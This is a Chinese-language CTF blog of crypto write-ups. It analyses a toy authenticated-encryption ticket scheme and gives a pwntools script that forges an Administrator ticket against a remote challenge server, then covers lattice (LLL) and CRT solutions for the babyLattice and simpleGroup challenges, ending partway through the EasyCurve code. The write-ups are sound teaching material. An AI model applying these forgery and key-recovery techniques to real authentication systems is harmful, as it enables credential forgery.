strxor(self.cipher.encrypt(self.L)[:len(M_list[-1])], M_list[-1]) self.Sigma = strxor(self.Sigma, self.pad(M_list[-1], self.n_size)) C_list.append(Cm) if len(M_list[-1]) == self.n_size: multer = strxor(long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)), self.delta) else: multer = long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)) TE = self.cipher.encrypt(strxor(self.Sigma, multer)) return b\u0026#39;\u0026#39;.join(C_list), TE def A_DF(self, ct): self.Sigma = b\u0026#39;\\x00\u0026#39; * self.n_size self.L = self.cipher.encrypt(b\u0026#39;ConvenienceFixed\u0026#39;) self.delta = b\u0026#39;DeltaConvenience\u0026#39; m = len(ct) // self.n_size m += 1 if (len(ct) % self.n_size) else 0 C_list = [ct[i * self.n_size : (i + 1) * self.n_size] for i in range(m)] M_list = [] for i in range(0, (m-1) // 2): M1, M2 = self.feistel_dec_2r(C_list[2*i], C_list[2*i +1]) self.Sigma = strxor(M2 ,self.Sigma) self.L = long_to_bytes(self.GF2_mul(2, bytes_to_long(self.L), self.n_size)) M_list.append(M1) M_list.append(M2) if m \u0026amp; 1 == 0: Mm_1 = strxor(self.cipher.encrypt(strxor(strxor(self.L, self.delta), self.pad(C_list[-1], self.block_size))), C_list[-2]) Z = self.cipher.encrypt(strxor(self.L, Mm_1)) Mm = strxor(Z[:len(C_list[-1])], C_list[-1]) self.Sigma = strxor(self.Sigma, strxor(Z, self.pad(C_list[-1], self.block_size))) self.L = strxor(self.L, self.delta) M_list.append(Mm_1) M_list.append(Mm) else: Mm = strxor(self.cipher.encrypt(self.L)[:len(C_list[-1])], C_list[-1]) self.Sigma = strxor(self.Sigma, self.pad(Mm, self.block_size)) M_list.append(Mm) if len(C_list[-1]) == self.n_size: multer = strxor(long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)), self.delta) else: multer = long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)) TE = self.cipher.encrypt(strxor(self.Sigma, multer)) return b\u0026#39;\u0026#39;.join(M_list), TE def feistel_enc_2r(self, M1, M2): C1 = strxor(self.cipher.encrypt(strxor(M1, self.L)), M2) C2 = strxor(self.cipher.encrypt(strxor(C1, strxor(self.L, self.delta))), M1) return C1, C2 def feistel_dec_2r(self, C1, C2): M1 = strxor(self.cipher.encrypt(strxor(C1, strxor(self.L, self.delta))), C2) M2 = strxor(self.cipher.encrypt(strxor(M1, self.L)), C1) return M1, M2 task.py\n#!/usr/bin/env python3 import os import random import string from hashlib import sha256 from Toy_AE import Toy_AE from secret import FLAG def proof_of_work(): random.seed(os.urandom(8)) proof = b\u0026#39;\u0026#39;.join([random.choice(string.ascii_letters + string.digits).encode() for _ in range(20)]) digest = sha256(proof).hexdigest().encode() print(\u0026#34;sha256(XXXX+%s) == %s\u0026#34; % (proof[4:],digest)) print(\u0026#34;Give me XXXX:\u0026#34;) x = input().encode() return False if len(x) != 4 or sha256(x + proof[4:]).hexdigest().encode() != digest else True def pack(uid, uname, token, cmd, appendix): r = b\u0026#39;\u0026#39; r += b\u0026#39;Uid=%d\\xff\u0026#39; % uid r += b\u0026#39;UserName=%s\\xff\u0026#39; % uname r += b\u0026#39;T=%s\\xff\u0026#39; % token r += b\u0026#39;Cmd=%s\\xff\u0026#39; % cmd r += appendix return r def unpack(r): data = r.split(b\u0026#34;\\xff\u0026#34;) uid, uname, token, cmd, appendix = int(data[0][4:]), data[1][9:], data[2][2:], data[3][4:], data[4] return (uid, uname, token, cmd, appendix) def apply_ticket(): uid = int(input(\u0026#34;Set up your user id:\u0026#34;)[:5]) uname = input(\u0026#34;Your username:\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] if uname == b\u0026#34;Administrator\u0026#34;: print(\u0026#34;Sorry, preserved username.\u0026#34;) return token = sha256(uname).hexdigest()[:max(8, uid % 16)].encode(\u0026#34;ascii\u0026#34;) cmd = input(\u0026#34;Your command:\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] if cmd == b\u0026#34;Give_Me_Flag\u0026#34;: print(\u0026#34;Not allowed!\u0026#34;) return appendix = input(\u0026#34;Any Appendix?\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] msg = pack(uid, uname, token, cmd, appendix) ct, te = ae.encrypt(msg) print(\u0026#34;Your ticket:%s\u0026#34; % ct.hex()) print(\u0026#34;With my Auth:%s\u0026#34; % te.hex()) def check_ticket(): ct = bytes.fromhex(input(\u0026#34;Ticket:\u0026#34;)) te = bytes.fromhex(input(\u0026#34;Auth:\u0026#34;)) msg = ae.decrypt(ct, te) assert msg uid, uname, token, cmd, appendix = unpack(msg) if uname == b\u0026#34;Administrator\u0026#34; and cmd == b\u0026#34;Give_Me_Flag\u0026#34;: print(FLAG) exit(0) else: print(\u0026#34;Nothing happend.\u0026#34;) def menu(): print(\u0026#34;Menu:\u0026#34;) print(\u0026#34;[1] Apply Ticket\u0026#34;) print(\u0026#34;[2] Check Ticket\u0026#34;) print(\u0026#34;[3] Exit\u0026#34;) op = int(input(\u0026#34;Your option:\u0026#34;)) assert op in range(1, 4) if op == 1: apply_ticket() elif op == 2: check_ticket() else: print(\u0026#34;Bye!\u0026#34;) exit(0) if __name__ == \u0026#34;__main__\u0026#34;: ae = Toy_AE() if not proof_of_work(): exit(-1) for _ in range(4): try: menu() except: exit(-1) 可恶，果然是这样吗。。不只代码长，甚至附件都有俩。害，慢慢啃咯。。。先不管这个加密的具体是啥，来看看功能是啥叭。程序有俩功能，提供ticket，和检查ticket，获取flag的点在检查ticket，\ndef decrypt(self, ct, _te): msg, te = self.A_DF(ct) return msg if _te == te else None msg = ae.decrypt(ct, te) assert msg uid, uname, token, cmd, appendix = unpack(msg) if uname == b\u0026#34;Administrator\u0026#34; and cmd == b\u0026#34;Give_Me_Flag\u0026#34;: print(FLAG) 要求你的这个ticket代表的信息是，用户名是Administrator，要执行的命令是Give_Me_Flag，并且还要提供这个ticket的签名Auth来保证他的合法性。\n再来看看这个提供ticket有啥，\ndef apply_ticket(): uid = int(input(\u0026#34;Set up your user id:\u0026#34;)[:5]) uname = input(\u0026#34;Your username:\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] if uname == b\u0026#34;Administrator\u0026#34;: print(\u0026#34;Sorry, preserved username.\u0026#34;) #return token = sha256(uname).hexdigest()[:max(8, uid % 16)].encode(\u0026#34;ascii\u0026#34;) cmd = input(\u0026#34;Your command:\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] if cmd == b\u0026#34;Give_Me_Flag\u0026#34;: print(\u0026#34;Not allowed!\u0026#34;) #return appendix = input(\u0026#34;Any Appendix?\u0026#34;).encode(\u0026#34;ascii\u0026#34;)[:16] msg = pack(uid, uname, token, cmd, appendix) 他要求你提供，uid，用户名，cmd，和额外的可选择的信息。其中，用户名不能等于Administrator，cmd不能等于Give_Me_Flag。（不然这题直接就没了。）然后他会生成一个你的用户名的sha256的摘要，至于存多少长读进你的message呢，由你的uid来决定。\ntoken = sha256(uname).hexdigest()[:max(8, uid % 16)].encode(\u0026#34;ascii\u0026#34;) 然后一些限制是，除了uid最大为5位数字之外，其余输入最多只能16个字符，并且每个字符的ascii都得在0-128之间（由decode(‘ascii’)限制）。（不然你要是输入\\xff，这题也直接就没了）\n所以题目意思很明确，你要伪造密文，并且还要能够构造对应的签名来通过合法性验证。让他解密信息后用户名为Administrator，cmd为Give_Me_Flag。然后由于对输入做的诸多限制，（甚至一次连接只能交互4次，除去一次来获取flag，只能交互三次，下一次连接就生成新的Toy_AE对象，生成新的key了）导致漏洞点大概率不会出现在这个task文件中，，那就要找这个Toy_AE算法的洞了。（啊，好长，不想看）\n一点点啃叭，先大致随便看看，然后我们有目的性的先来看看生成Auth的过程。（单独拎出来会清晰些）\nself.Sigma = b\u0026#39;\\x00\u0026#39; * self.n_size self.Sigma = strxor(M_list[2*i +1], self.Sigma) if 组数为偶数： Z = self.cipher.encrypt(strxor(self.L, M_list[-2])) Cm = strxor(Z[:len(M_list[-1])], M_list[-1]) self.Sigma = strxor(self.Sigma, strxor(Z, self.pad(Cm, self.block_size))) else: self.Sigma = strxor(self.Sigma, self.pad(M_list[-1], self.n_size)) TE = self.cipher.encrypt(strxor(self.Sigma, multer)) TE = self.cipher.encrypt(strxor(self.Sigma, multer)) 可以看到，如果组数为偶数，就会多生成一个Z，而且生成的密文方式也会比较麻烦，那么我们就先利用那个附加信息来控制组数，尽量避免这个麻烦的东西。\n这样子的话Sigma第2块、第4块明文、填充后的第5块明文的异或，然后和multer\nif len(M_list[-1]) == self.n_size: multer = strxor(long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)), self.delta) else: multer = long_to_bytes(self.GF2_mul(3, bytes_to_long(self.L), self.n_size)) （multer和L有关，不可知，那就不管了）异或，最后AES加密，返回密文。\n由于AES的key也不可知，所以我们想要拿到Auth，没别的方法了。只能在传明文获取Auth时，让我们的msg的第二块和第四块和第五块和真正的能拿到FLAG的msg的明文保持一致了。\n这里一个做法就是，本地跑这个程序，把那些麻烦的PoW啥的去去掉，一些限制（比如用户名不能是Administrator）也去去掉，然后打印一些方便我们审计的信息，（当然，熟用那种自带debug编译器的大佬可以忽略，IDLE选手还是比较喜欢print debug大法）\n那就是怎么伪造密文了。\n先看看密文的生成\nC1, C2 = self.feistel_enc_2r(M_list[2*i], M_list[2*i +1]) def feistel_enc_2r(self, M1, M2): C1 = strxor(self.cipher.encrypt(strxor(M1, self.L)), M2) C2 = strxor(self.cipher.encrypt(strxor(C1, strxor(self.L, self.delta))), M1) return C1, C2 我们把明文和密文看成16字节一块，两块一组，两块明文对自己这组生成的密文有影响，但每组明文间的加密是独立的。也就是第一组（第一二块）明文不影响第二组（第三四块）明文生成的第二块密文。\n那么，如果我们的uid是1，用户名是Administrator，cmd是Give_Me_Flag，不加信息，\n（本地起这个程序，把用户名和cmd的限制给取消掉，然后打印一下M_list）\nimage-20201102204318891\n我们会生成4块明文，[b'Uid=1\\xffUserName=A', b'dministrator\\xffT=e', b'7d3e769\\xffCmd=Give', b'_Me_Flag\\xff']\n前面说了，为了让生成的Auth便于计算，我们要加入附加信息（Appendix）来控制明文组数。\n但这里先看看M_list叭，如果我们想要得到Auth，那么我们就得保证我们构造的用户名和cmd在不等于限定值的情况下，M_list的第二组和第四组与用户名为Administrator和cmd为Give_Me_Flag时的M_list的相应分组相同。\n这样子看过去，对于我们目前得到的这个M_list是很好构造的，由于Administrator的A在第一组，那么我们注册Bdministrator；由于Give_Me_Flag的Give在第三组，那么我们注册give_Me_Flag就好了。然后加一加Appendix控制下组数。但是注意到第二组最后一位是sha256的首位，而我们要是动了用户名，这个值大概率也有变，所以我们还得控制这个用户名的首位，可能不能是B，我们就在ascii 为0到128之间找一个字符*，让*dministrator的sha256的首位为e就可以了。经过测试，字符‘P’就是一个合适的值\nimage-20201102234733848\n看，上面是目标Auth，下面是我们伪造的用户名和cmd获取的Auth，他们是一致的。所以Auth这一关过了。那就只剩下密文的伪造了。\n对于第一组，是由uid和用户名决定的。其中uid不用伪造，问题不大，但是用户名的密文咋办，我们用户名不能等于Administrator，但是又要搞到的Administrator的密文。\n这里用到的第一技巧就是，增加uid的长度，反正uid最后模16了，我们控制uid长度为5，用户名为Administratorr（多了一个r），这样子对照一下，\nimage-20201102235135632\n可以发现，多出来的那个r正好被挤到第三组去了，这样子我们的用户名既没有等于Administrator，但是又获得了前两块属于Administrator的msg的密文。\nok。一半的工作完成。\n第二组，由于uid那么构造了，那么第二组明文就是这样子的，b'r\\xffT=ab86207b\\xffCmd', b'=Give_Me_Flag\\xff由hash和cmd和组成（这里只是测试，附加信息就先不加了）。\n这里我们要的是cmd=Give_Me_Flag的密文，怎么伪造cmd呢？我们不能改变任何一个字符，不然由于AES的存在，密文整个就不一样了。但是输入的cmd又不能等于Give_Me_Flag。这里我们还是用前面的方法，由于这里分组加密的特性，我们把cmd顶到第二块的末尾，大概就是让第二组的第二块明文是这样子，\n\u0026#39;Cmd=Give_Me_Flag\u0026#39; 刚好16个字节，然后我们的命令就可以改成Give_Me_Flagg，多的g到第五块去了，咱们就不用管了。至于怎么顶，这里就要利用uid了，在uid长度仍然保持为5的情况下，进行加减，控制hash的长度为12就好了，11111%16 = 7，那就用11116，\nimage-20201218133935540\n可以看到这样\\xffT=4110a98d23fc\\xff刚好占满了第二组第一块的16字节，'Cmd=Give_Me_Flag占了另一块。而我们输入的cmd命令是Give_Me_Flagg，是能过验证的。这样交互，让他加密，就能得到明文：b'\\xffT=4110a98d23fc\\xff', b'Cmd=Give_Me_Flag'生成的密文了。但是这里还有个问题，hash由用户名控制，用户名为Administrator的12位hash是e7d3e769f3f5，然而我们又不能注册用户为Administrator，那一个想法就是，碰撞，找一个由可见字符串组成的13位字符串（Administrator的长度），sha256后前12位为e7d3e769f3f5就可以了。然而这显然不现实，12位是96bit，有这算力，比特币不是随便挖？所以这题有解的一个原因就是，这个系统并没有验证用户名的hash，所以你随便整个用户名就好(我们这里就用的Administratos)。\n但是新问题产生了，Auth的获取怎么办？现在我们的uid=11116，我们来看看用户名为Administrator，cmd为Give_Me_Flag的情况\nimage-20201103001239680\n想要得到Auth，就得构造同样的第二块、第四块明文，第二块明文还好说，用户名我们多打一个字符就能绕过检查了，而这个字符也会被顶到第三块，对Auth没有影响，并且我们也可以uid相应的减1，让第四块密文不受到影响。但是第四块的明文本身就不好操作啊，这里要是也多打一个字符绕过的话，第五组就多了一个字符，这样产生的Auth就完全对不上了。\n所以要把证获取到正确的Auth，我们需要第二块，第四块，第五块分别为：b'me=Administrator', b'Cmd=Give_Me_Flag', b'\\xff'\n这里我的做法是，缩短uid为两位长，构造用户名为：me=Administrator，控制uid%16为8，构造cmd为Cmd=Give_Me_Flag\nimage-20201103002724699\n可以看到是完全一致的。如果此时打印出来了C_list的话，也会发现，此时这两组产生的C_list的最后一组也是一致的，因为我们这里M_list的到数两组是一致的。\n解题流程 # 所以这道题的整个解题流程：（交互可以直接手撸）\nuid：24，name：me=Administrator，cmd：Cmd=Give_Me_Flag 获取Auth和第三段密文 uid：11116，name：me=Administratorr，后面随意 获取第一段密文 uid：11116，name：Administratos，cmd：Give_Me_Flagg 获取第二段密文 发送Auth和三段密文的拼接，获取flag exp\nfrom pwn import * sh=remote(\u0026#34;123.57.4.93\u0026#34;,\u0026#34;45216\u0026#34;) from pwnlib.util.iters import mbruteforce from hashlib import sha256 context.log_level = \u0026#39;debug\u0026#39; def proof_of_work(sh): sh.recvuntil(\u0026#34;XXXX+b\\\u0026#39;\u0026#34;) suffix = sh.recvuntil(\u0026#34;\\\u0026#39;\u0026#34;).decode(\u0026#34;utf8\u0026#34;)[:-1] log.success(suffix) sh.recvuntil(\u0026#34;== b\\\u0026#39;\u0026#34;) cipher = sh.recvuntil(\u0026#34;\\\u0026#39;\u0026#34;).decode(\u0026#34;utf8\u0026#34;)[:-1] print(suffix) print(cipher) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method=\u0026#39;fixed\u0026#39;) sh.sendlineafter(\u0026#34;Give me XXXX:\u0026#34;, proof) proof_of_work(sh) sh.recvuntil(\u0026#34;option:\u0026#34;) sh.sendline(\u0026#39;1\u0026#39;) sh.recvuntil(\u0026#34;id:\u0026#34;) sh.sendline(\u0026#39;24\u0026#39;) sh.recvuntil(\u0026#34;name:\u0026#34;) sh.sendline(\u0026#34;me=Administrator\u0026#34;) sh.recvuntil(\u0026#34;and:\u0026#34;) sh.sendline(\u0026#34;Cmd=Give_Me_Flag\u0026#34;) sh.recvuntil(\u0026#34;?\u0026#34;) sh.sendline(\u0026#34;\u0026#34;) sh.recvuntil(\u0026#34;ket:\u0026#34;) ticket=sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;Auth:\u0026#34;) Auth=sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;option:\u0026#34;) sh.sendline(\u0026#34;1\u0026#34;) sh.recvuntil(\u0026#34;id:\u0026#34;) sh.sendline(\u0026#34;65548\u0026#34;) sh.recvuntil(\u0026#34;name:\u0026#34;) sh.sendline(\u0026#34;Administratorr\u0026#34;) sh.recvuntil(\u0026#34;and:\u0026#34;) sh.sendline(\u0026#34;Give_Me_Flagg\u0026#34;) sh.recvuntil(\u0026#34;?\u0026#34;) sh.sendline(\u0026#34;\u0026#34;) sh.recvuntil(\u0026#34;ket:\u0026#34;) ticket1=sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;option:\u0026#34;) sh.sendline(\u0026#39;1\u0026#39;) sh.recvuntil(\u0026#34;id:\u0026#34;) sh.sendline(\u0026#39;65548\u0026#39;) sh.recvuntil(\u0026#34;name:\u0026#34;) sh.sendline(\u0026#34;Administratos\u0026#34;) sh.recvuntil(\u0026#34;and:\u0026#34;) sh.sendline(\u0026#34;Give_Me_Flagg\u0026#34;) sh.recvuntil(\u0026#34;?\u0026#34;) sh.sendline(\u0026#34;\u0026#34;) sh.recvuntil(\u0026#34;ket:\u0026#34;) ticket2=sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;option:\u0026#34;) sh.sendline(\u0026#39;2\u0026#39;) sh.recvuntil(\u0026#34;Ticket:\u0026#34;) sh.sendline(ticket1[:64]+ticket2[64:64*2]+ticket[-2:]) sh.recvuntil(\u0026#34;Auth:\u0026#34;) sh.sendline(Auth) sh.interactive() 2021 AntCTF x D^3CTF # babyLattice # 题目分析 # 这道题的题目如下\nfrom collections import namedtuple PublicKey = namedtuple(\u0026#39;PublicKey\u0026#39;, [\u0026#39;n\u0026#39;, \u0026#39;b\u0026#39;]) SecretKey = namedtuple(\u0026#39;SecretKey\u0026#39;, [\u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;A\u0026#39;]) def gen_key(): p = random_prime(2^512, lbound=2^511) q = random_prime(2^512, lbound=2^511) n = p * q a11, a12, a21 = [random_prime(2^100) for _ in range(3)] a22 = random_prime(2^100) while a11 * a22 == a12 * a21: a22 = random_prime(2^100) A = Matrix(ZZ, [[a11, a12], [a21, a22]]) a1 = crt([a11, a21], [p, q]) a2 = crt([a12, a22], [p, q]) b = a1 * inverse_mod(a2, n) % n PK = PublicKey(n, b) SK = SecretKey(p, q, A) return (PK, SK) def encrypt(m, pk): assert 0 \u0026lt; m \u0026lt; 2^400 r = randint(0, 2^400-1) c = (pk.b*m + r) % pk.n return c def decrypt(c, sk): a2 = crt([sk.A[0,1], sk.A[1,1]], [sk.p, sk.q]) s1 = a2 * c % sk.p s2 = a2 * c % sk.q m, r = sk.A.solve_right(vector([s1, s2])) return m def test(pk, sk, num=3): for _ in range(num): m = randint(0, 2^400-1) c = encrypt(m, pk) mm = decrypt(c, sk) assert m == mm if __name__ == \u0026#39;__main__\u0026#39;: from hashlib import sha256 from secret import m, FLAG assert FLAG == \u0026#39;d3ctf\u0026#39; % sha256(int(m).to_bytes(50, \u0026#39;big\u0026#39;)).hexdigest() PK, SK = gen_key() test(PK, SK) c = encrypt(m, PK) print(f\u0026#34;PK = {PK}\u0026#34;) print(f\u0026#34;c = {c}\u0026#34;) 我们重点看看加密函数\n也就是\n这样就可以通过LLL算法还原出m了\nEXP # from hashlib import sha256 n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196 c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570 A = Matrix(ZZ,[[1,0,b],[0,2^400,c],[0,0,n]]) A = A.LLL() m = int(A[0][0]) flag = \u0026#39;d3ctf\u0026#39; % sha256(int(m).to_bytes(50, \u0026#39;big\u0026#39;)).hexdigest() print(flag) simpleGroup # 题目分析 # 这道题的题目如下\nfrom random import randint from secret import FLAG # A gift for key recovery in challenge [babyLattice] n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328 e = 1928983487 M = int.from_bytes(FLAG, \u0026#39;big\u0026#39;) C = [] while M != 0: m = M % e M //= e r = randint(0, n-1) c = power_mod(y, m, n) * power_mod(r, e, n) C.append(c % n) print(f\u0026#34;C = {C}\u0026#34;) 通过注释我们可以大概猜测babyLattice本来是需要分解n的，但是因为被非预期了所以又出了这道题目\n那么我们回到babyLattice题目里面，我们知道的参数实际上只有b,c,n，分解n应该和b有关，通过阅读b的生成代码我们可以得到\n我们展开后两个式子\n也就是\n两边相乘得到\n展开并变形得到\n也就是\n由于\n所以我们同样可以用LLL还原出目标向量，然后使用factor进行分解（a11,a12,a21,a22它们都是素数）\n当分解完毕后，通过猜测它们对应的值来分解n，即\n得到p,q后，我们回来看题目里面的加密，其会对FLAG进行取模并分段加密余数，其中c的生成公式如下\nr是随机生成的数字，而e可以被分解为e1和e2两个素数，这两个素数又分别是p-1和q-1的因子\n那么我们可以得到\n通过遍历j并判断得到的c'是不是为模p的e1次剩余，我们就可以得到m模e1的值\n同样我们也可以用q得到m模e2的值，然后使用中国剩余定理即可还原m并最终得到flag\nEXP # n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196 c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570 A = Matrix(ZZ,[[1,0,b^2],[0,1,b],[0,0,n]]) A = A.LLL() x1 = -A[0][0] x3 = A[0][2] print(factor(x1)) print(factor(x3)) a12 = 1018979931854255696816714991181 a22 = 1151291153120610849180830073509 a11 = 1017199123798810531137951821909 a21 = 207806651167586080788016046729 print(gcd(b * a12 - a11,n)) print(gcd(b * a22 - a21,n)) p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309 q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629 assert(p * q == n) #!/usr/bin/env python from Crypto.Util.number import * import gmpy2 p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309 q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629 n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328 e = 1928983487 e1 = 36493 e2 = 52859 def GCRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) K = c // d * gmpy2.invert(curm // d, m // d) cura += curm * K curm = curm * m // d cura %= curm return (cura % curm, curm) def check(d,p,n): if((p - 1) % n == 0): return pow(d,(p - 1) // n,p) == 1 else: k = gmpy2.gcd(n, p - 1) return pow(d,(p - 1) // k,p) == 1 def getM(c,e,p): for i in range(2,e): tmpc = (c * gmpy2.invert(pow(y,i,p),p)) % p if check(tmpc,p,e): return i exit(0) C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428] m = 0 for c in C[::-1]: cp = c % p cq = c % q m1 = getM(cp,e1,p) m2 = getM(cq,e2,q) mm,lcm = GCRT([e1,e2],[m1,m2]) print(\u0026#34;Get mm: \u0026#34; + hex(mm)) m *= e m += mm flag = long_to_bytes(m) print(flag) EasyCurve # 题目分析 # 这道题目的主要部分如下\nimport socketserver from Crypto.PublicKey import RSA from Crypto.Util.number import getPrime , bytes_to_long from Curve import MyCurve from hashlib import sha256 import os import string import random import signal from secret import flag BIT = 2048 p = 9688074905643914060390149833064012354277254244638141162997888145741631958242340092013958501673928921327767591959476890238698855704376126231923819603296257 class Task(socketserver.BaseRequestHandler): def proof_of_work(self): random.seed(os.urandom(8)) proof = \u0026#39;\u0026#39;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) _hexdigest = sha256(proof.encode()).hexdigest() self.send(f\u0026#34;sha256(XXXX+{proof[4:]}) == {_hexdigest}\u0026#34;.encode()) self.send(b\u0026#39;Give me XXXX: \u0026#39;) x = self.recv() if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: self.send(\u0026#39;wrong\u0026#39;) return False return True def recv(self): data = self.request.recv(1024) return data.strip() def send(self, msg, newline=True): if isinstance(msg , bytes): msg += b\u0026#39;\\n\u0026#39; else: msg += \u0026#39;\\n\u0026#39; msg = msg.encode() self.request.sendall(msg) def key_gen(self , bit): key = RSA.generate(bit) return key def ot(self , point): x , y = point random.seed(os.urandom(8)) key = self.key_gen(BIT) self.send(\u0026#39;n = \u0026#39; + str(key.n)) self.send(\u0026#39;e = \u0026#39; + str(key.e)) x0 = random.randint(1 , key.n) x1 = random.randint(1 , key.n) self.send(\u0026#34;x0 = \u0026#34; + str(x0)) self.send(\u0026#34;x1 = \u0026#34; + str(x1)) self.send(\u0026#34;v = \u0026#34;) v = int(self.recv()) m0_ = (x + pow(v - x0, key.d, key.n)) % key.n m1_ = (y + pow(v - x1, key.d, key.n)) % key.n self.send(\u0026#34;m0_ = \u0026#34; + str(m0_)) self.send(\u0026#34;m1_ = \u0026#34; + str(m1_)) def handle(self): signal.alarm(180) if not self.proof_of_work(): return 0 e = bytes_to_long(os.urandom(32)) u = random.randint(1 , p) D = random.randint(1 , p) curve = MyCurve(p , D , u) self.send(\u0026#39;p = \u0026#39; + str(p)) self.send(\u0026#39;D = \u0026#39; + str(D)) for i in range(3): G = curve.getPoint() self.ot(G) P = curve.mul(e , G) self.ot(P) self.send(\u0026#34;do you know my e?\u0026#34;) guess = int(self.recv()) if guess == e: self.send(\u0026#34;oh no!\u0026#34;) self.send(flag) return 0 else: self.send(\u0026#34;Ha, I know you can\u0026#39;t get it.\u0026#34;) class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10000 server = 